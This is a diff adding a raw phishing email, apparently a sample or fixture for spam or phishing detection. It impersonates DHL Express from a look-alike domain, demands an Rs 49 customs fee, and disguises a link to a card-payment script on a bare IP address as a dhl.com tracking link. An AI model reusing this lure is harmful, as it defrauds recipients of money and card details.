@@ -1,0 +1,29 @@
+From: "DHL Express" <tracking@dhl-parcel-notice.info>
+To: arun@gmail.com
+Subject: Parcel on hold - customs fee pending
+Date: Fri, 18 Sep 2026 07:00:00 +0000
+Message-ID: <t5@dhl-parcel-notice.info>
+Received: from unknown (unknown [45.95.147.10]) by mx.google.com with ESMTPS
+ id x1; Fri, 18 Sep 2026 07:00:04 +0000
+Authentication-Results: mx.google.com; spf=softfail
+ smtp.mailfrom=dhl-parcel-notice.info; dkim=none; dmarc=none
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============0173512574598821978=="
+
+--===============0173512574598821978==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Your parcel is on hold. Pay the customs fee of Rs 49 to release it.
+
+--===============0173512574598821978==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Your parcel is on hold. Pay the customs fee of Rs 49 to releas=
+e it.</p><a href=3D"http://45.95.147.10/dhl/pay.php?session=3Dverify&card=3D1=
+">https://www.dhl.com/track</a></body></html>
+
+--===============0173512574598821978==--
